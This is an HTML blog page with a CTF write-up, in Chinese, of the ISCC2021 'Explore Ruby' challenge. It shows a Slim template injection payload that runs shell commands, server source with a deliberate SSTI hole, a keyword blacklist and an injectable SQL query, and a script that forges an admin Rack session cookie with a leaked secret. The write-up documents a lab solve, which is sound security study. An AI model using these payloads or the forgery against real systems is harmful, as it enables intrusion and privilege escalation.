@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于网络安全、CTF竞赛、技术研究的个人博客">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="N0P3">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="ISCC2021"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于网络安全、CTF竞赛、技术研究的个人博客" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="N0P3&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>ISCC2021 - N0P3&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/05/01/iscc2021/">
+                ISCC2021
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-05-01</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="Explore-Ruby"><a href="#Explore-Ruby" class="headerlink" title="Explore Ruby"></a>Explore Ruby</h1><p>题目两个入口，以为是给选手两个环境，防止注册太多用户，做到后面才知道不是。</p>
+<p>首先是入口1，输入框的背景字是‘demo‘，下文就称这个入口的网站为demo。</p>
+<p>demo环境可以注册，进去发现一个输入框，输入多数字符会直接显示，少数字符会返回“不对哦，在(再)试试吧”。例如可以执行命令的反引号。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8810.29.19.png" alt="截屏2021-05-11 上午10.29.19"></p>
+<p>网站下方标有网站所用的模板</p>
+<p>想到可能是ssti，现在就需要知道这个模板引擎的解析符号是什么（例如flask 是”\{\{\}\}”)</p>
+<p>在google上搜索相关内容。可知slim的模板标记符是#{}</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8810.38.21.png" alt="截屏2021-05-11 上午10.38.21"></p>
+<p>测试成功</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8810.45.35.png" alt="截屏2021-05-11 上午10.45.35"></p>
+<p>接下来就是找一找ruby如何执行命令</p>
+<p>反引号，system都被过滤了。最后找到#{ %x|env| }</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8810.51.00.png" alt="截屏2021-05-11 上午10.51.00"></p>
+<p>可见有环境变量FLAG但是内容是假flag&#x3D;&#x3D;</p>
+<p>ls</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8810.49.50.png" alt="截屏2021-05-11 上午10.49.50"></p>
+<p>没有命令被过滤，可以任意执行。</p>
+<p>读网站源码webserver.rb</p>
+<p></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;slim&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sqlite3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># don&#x27;t minify HTML</span></span><br><span class="line"><span class="title class_">Slim</span><span class="symbol">:</span><span class="symbol">:Engine</span>.set_options <span class="symbol">pretty:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  set <span class="symbol">:public_folder</span>, <span class="string">&#x27;public&#x27;</span></span><br><span class="line">  set <span class="symbol">:views</span>, <span class="string">&#x27;views&#x27;</span></span><br><span class="line">  set <span class="symbol">:bind</span>, <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">  set <span class="symbol">:port</span>, <span class="number">9999</span></span><br><span class="line">  enable <span class="symbol">:sessions</span></span><br><span class="line">  set <span class="symbol">:server</span>, <span class="string">%w[thin webrick]</span></span><br><span class="line">  set <span class="symbol">:environment</span>, <span class="symbol">:production</span></span><br><span class="line">  <span class="comment">#set :environment, :development</span></span><br><span class="line">  <span class="comment">#disable :protection</span></span><br><span class="line">  set <span class="symbol">:session_secret</span>, <span class="string">&#x27;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate!</span></span><br><span class="line">  <span class="keyword">unless</span> session[<span class="symbol">:username</span>]</span><br><span class="line">    redirect to(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Create DB ###</span></span><br><span class="line"><span class="comment"># db = SQLite3::Database.new &#x27;database.db&#x27;</span></span><br><span class="line"><span class="comment"># Create a table</span></span><br><span class="line"><span class="comment"># rows = db.execute &lt;&lt;-SQL</span></span><br><span class="line"><span class="comment">#   create table users (</span></span><br><span class="line"><span class="comment">#     username varchar(20),</span></span><br><span class="line"><span class="comment">#     password varchar(20),</span></span><br><span class="line"><span class="comment">#     role varchar(20)</span></span><br><span class="line"><span class="comment">#   );</span></span><br><span class="line"><span class="comment"># SQL</span></span><br><span class="line"><span class="comment"># Add demo account</span></span><br><span class="line"><span class="comment"># db.execute(&#x27;INSERT INTO users (username, password, role) </span></span><br><span class="line"><span class="comment">#             VALUES (?, ?, ?)&#x27;, [&#x27;demo&#x27;, &#x27;demo&#x27;, &#x27;user&#x27;])</span></span><br><span class="line"><span class="comment"># db.close</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  redirect to(<span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/login&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="variable">@message</span> = params[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">  <span class="variable">@hide</span> = <span class="string">&#x27;hidden&#x27;</span> <span class="keyword">if</span> params[<span class="string">&#x27;message&#x27;</span>].<span class="literal">nil</span>?</span><br><span class="line">  slim <span class="symbol">:login</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/auth&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="comment"># Open a database</span></span><br><span class="line">  db = <span class="title class_">SQLite3::Database</span>.new <span class="string">&#x27;database.db&#x27;</span>, &#123;<span class="symbol">readonly:</span> <span class="literal">true</span>&#125;</span><br><span class="line">  user = params[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">  pass = params[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">  query = <span class="string">&quot;SELECT username, password, role FROM users WHERE username=&#x27;<span class="subst">#&#123;user&#125;</span>&#x27; AND password=&#x27;<span class="subst">#&#123;pass&#125;</span>&#x27;;&quot;</span></span><br><span class="line">  rows = db.execute(query)</span><br><span class="line">  db.close</span><br><span class="line">  <span class="keyword">unless</span> rows.empty?</span><br><span class="line">    username, password, role = rows.first</span><br><span class="line">    session.clear</span><br><span class="line">    session[<span class="symbol">:username</span>] = username</span><br><span class="line">    session[<span class="symbol">:role</span>] = role</span><br><span class="line">    redirect to(<span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sleep <span class="number">0.1</span></span><br><span class="line">    message = <span class="string">&#x27;错误的凭证!&#x27;</span></span><br><span class="line">    redirect to(<span class="string">&quot;/login?message=<span class="subst">#&#123;message&#125;</span>&quot;</span>) </span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/register&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  sleep <span class="number">0.1</span></span><br><span class="line">  message = <span class="string">&#x27;不可注册!&#x27;</span></span><br><span class="line">  redirect to(<span class="string">&quot;/login?message=<span class="subst">#&#123;message&#125;</span>&quot;</span>) </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/home&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  <span class="variable">@user</span> = session[<span class="symbol">:username</span>]</span><br><span class="line">  <span class="variable">@flag</span> = <span class="variable constant_">ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>] <span class="keyword">if</span> session[<span class="symbol">:role</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">  slim <span class="symbol">:home</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/logout&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  session.clear</span><br><span class="line">  message = <span class="string">&#x27;你已经退出登录啦.&#x27;</span></span><br><span class="line">  redirect to(<span class="string">&quot;/login?message=<span class="subst">#&#123;message&#125;</span>&quot;</span>) </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/id&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="string">&#x27;message&#x27;</span>].<span class="literal">nil</span>?</span><br><span class="line">    id = params[<span class="string">&#x27;message&#x27;</span>].unpack(<span class="string">&#x27;H*&#x27;</span>).first</span><br><span class="line">    redirect to(<span class="string">&quot;/id/<span class="subst">#&#123;id&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/home&#x27;</span>) </span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bad code</span></span><br><span class="line">get <span class="string">&#x27;/id/:id&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  message = [params[<span class="string">&#x27;id&#x27;</span>]].pack(<span class="string">&#x27;H*&#x27;</span>)</span><br><span class="line">  <span class="comment"># Filesystem is mounted in readonly so RCE is not so much a problem</span></span><br><span class="line">  <span class="comment"># but I prefer people to the the secret with the elegant solution</span></span><br><span class="line">  <span class="comment"># Sinatra::Application.settings.session_secret</span></span><br><span class="line">  <span class="comment"># rather than by reading the code source. So let&#x27;s put a little, certainly not</span></span><br><span class="line">  <span class="comment"># unbreakable, blacklist.</span></span><br><span class="line">  blacklist_methods = <span class="regexp">/`|exec|foreach|fork|load|method_added|open|read(?!line$)|require|set_trace_func|spawn|syscall|system|base64|pack/</span></span><br><span class="line">  blacklist_classes = <span class="regexp">/(?&lt;!True|False|Nil)Class|Module|Dir|File|ObjectSpace|Process|Thread|IO/</span></span><br><span class="line">  blacklist_chars = <span class="regexp">/\(|\)|\[|\]/</span></span><br><span class="line">  <span class="keyword">if</span> blacklist_methods.match?(message) |<span class="params"></span>| blacklist_classes.match?(message) |<span class="params"></span>| blacklist_chars.match?(message)</span><br><span class="line">    message = <span class="string">&#x27;不对哦, 在试试吧！.&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="comment"># SSTI</span></span><br><span class="line">  template = <span class="title class_">File</span>.read(<span class="string">&#x27;views/id.slim&#x27;</span>).gsub(<span class="string">&#x27;@@@REPLACE@@@&#x27;</span>, message)</span><br><span class="line">  <span class="title class_">Slim</span><span class="symbol">:</span><span class="symbol">:Template</span>.new&#123; template &#125;.render</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">=begin</span></span><br><span class="line"><span class="comment"># Good code</span></span><br><span class="line"><span class="comment">get &#x27;/id/:id&#x27; do</span></span><br><span class="line"><span class="comment">  authenticate!</span></span><br><span class="line"><span class="comment">  <span class="doctag">@message</span> = [params[&#x27;id&#x27;]].pack(&#x27;H*&#x27;)</span></span><br><span class="line"><span class="comment">  slim :index</span></span><br><span class="line"><span class="comment">end</span></span><br><span class="line"><span class="comment">=end</span></span><br></pre></td></tr></table></figure>
+
+<p>找到身份验证的代码，发现这还是从环境变量里取出的FLAG。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8811.02.49.png" alt="截屏2021-05-11 上午11.02.49"></p>
+<p>翻了翻目录也没找到，突然注意到题目说的是<img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8811.31.55.png" alt="截屏2021-05-11 上午11.31.55"></p>
+<p>题目提到了两颗红宝石，也就是说两个环境是出题人准备的，想到可能是要我们拿demo的源码打flag环境。</p>
+<p>因为不会ruby，猜是session中的role字段要改成admin</p>
+<p>参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/181368.html">Cookie篡改</a></p>
+<p>rack_seesion的组成有两部分，前半部分是由ruby的Marshal.dump生成的序列化字符串，后半部分是签名</p>
+<p>前半部分是base64加密过的，url decode后直接base64解密就可以了。接着再用Marshal.load加载为对象</p>
+<p>结果如下</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;uri&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;pp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:8231&quot;</span></span><br><span class="line"></span><br><span class="line">secret_key=<span class="string">&quot;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&quot;</span></span><br><span class="line"></span><br><span class="line">decoded = <span class="title class_">Base64</span>.decode64(<span class="string">&quot;</span></span><br><span class="line"><span class="string">BAh7CkkiDXVzZXJuYW1lBjoGRUZJIgluMHAzBjsAVEkiCXJvbGUGOwBGSSIJ</span></span><br><span class="line"><span class="string">dXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRWQ0YmU0YTU5ODAzMDc3NjY3</span></span><br><span class="line"><span class="string">YzY4MzJkODhmZjExOTZlYWVhMTFmMTEwODdjODkzYTdlOGE0YzIyYTA1OTQ0</span></span><br><span class="line"><span class="string">NjUGOwBGSSIJY3NyZgY7AEZJIjFFenJPU3poSzBuMWZsVDZRdS93OWdnSCsy</span></span><br><span class="line"><span class="string">SzFpcGxnUnlteFFQejZzWnM4PQY7AEZJIg10cmFja2luZwY7AEZ7BkkiFEhU</span></span><br><span class="line"><span class="string">VFBfVVNFUl9BR0VOVAY7AFRJIi00NzExZTRhOTI3OGQyOTMyY2IzMjZmYzBj</span></span><br><span class="line"><span class="string">MmVhODBiYzJjMDcyZDJhBjsARg==</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line">object = <span class="title class_">Marshal</span>.load(decoded)</span><br><span class="line">pp object</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8811.06.44.png" alt="截屏2021-05-11 上午11.06.44"></p>
+<p>发现role字段。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create new session</span></span><br><span class="line">object[<span class="string">&quot;username&quot;</span>] = <span class="string">&#x27;n0p3&#x27;</span></span><br><span class="line">object[<span class="string">&quot;role&quot;</span>]=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">pp object</span><br><span class="line"><span class="comment"># new cookie:</span></span><br><span class="line">nc =<span class="title class_">Base64</span>.encode64(<span class="title class_">Marshal</span>.dump(object)) </span><br><span class="line">ns = <span class="title class_">Open</span>SSL::<span class="variable constant_">HMAC</span>.hexdigest(<span class="title class_">Open</span>SSL::<span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA1</span>.new,secret_key, nc) </span><br><span class="line">newcookie = <span class="variable constant_">URI</span>.encode(nc).gsub(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;%3D&quot;</span>)+<span class="string">&quot;--&quot;</span>+ns</span><br><span class="line"><span class="comment">#pp object</span></span><br><span class="line">pp newcookie</span><br></pre></td></tr></table></figure>
+
+<p>生成新cookie</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2021%E6%88%AA%E5%B1%8F2021-05-11%20%E4%B8%8A%E5%8D%8811.34.26.png" alt="截屏2021-05-11 上午11.34.26"></p>
+<p>Nice。</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/CTF/">#CTF</a> <a href="/tags/参加的比赛/">#参加的比赛</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2020/10/28/BuuWeb1/">BuuWeb1</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/10/18/Off-by-one/">Asis_ctf_2016_b00ks</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/08/10/Xctf2/">XCTF-Pwn-Advance-2</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/07/17/BuuCtf1/">「BuuCTF」Part I</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/CTF%E8%A7%A3%E9%A2%98/">CTF解题</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/CTF%E8%A7%A3%E9%A2%98/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://telegram.org/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
